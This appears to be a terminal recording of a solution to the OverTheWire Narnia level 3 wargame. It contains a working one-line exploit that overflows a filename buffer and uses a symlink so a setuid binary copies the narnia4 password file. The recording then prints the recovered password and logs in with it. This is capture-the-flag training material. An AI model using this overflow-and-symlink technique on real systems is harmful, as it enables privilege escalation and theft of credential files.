[0.001, "o", "$ overflow: a 27-char dir name makes argv[1] = /tmp/<27 A>/tmp/out3\r\r\n$   the first 32 bytes fill ifile; bytes 33+ overwrite ofile -> \"/tmp/out3\"\r\r\n$ symlink that path to the narnia4 password, pre-create /tmp/out3, run the binary\r\r\n$ ssh narnia3@narnia.labs.overthewire.org -p 2226 D=$(python3 -c \"print(\\\"A\\\"*27)\"); mkdir -p \"/tmp/$D/tmp\"; ln -sf /etc/narnia_pass/narnia4 \"/tmp/$D/tmp/out3\"; rm -f /tmp/out3; touch /tmp/out3; chmod 666 /tmp/out3; P=\"/tmp/$D/tmp/out3\"; echo \"argv[1] = $P\"; echo \"  bytes 1-32 (ifile): ${P:0:32}\"; echo \"  bytes 33+ (ofile): ${P:32}\"; /narnia/narnia3 \"$P\"; echo \"--- /tmp/out3 contains:\"; head -c 11 /tmp/out3; echo\r\r\n"]
[6.653, "o", "argv[1] = /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/out3\r\r\n  bytes 1-32 (ifile): /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA\r\r\n  bytes 33+ (ofile): /tmp/out3\r\r\ncopied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/out3 to a safer place... (/tmp/out3)\r\r\n--- /tmp/out3 contains:\r\r\nCyWyf6uGWQ\r\r\n\r\r\n"]
[0.000, "o", "$ ssh narnia4@narnia.labs.overthewire.org -p 2226   # verify CyWyf6uGWQ\r\r\n$ ssh narnia4@narnia.labs.overthewire.org -p 2226 whoami\r\r\n"]
[6.705, "o", "narnia4\r\r\n"]
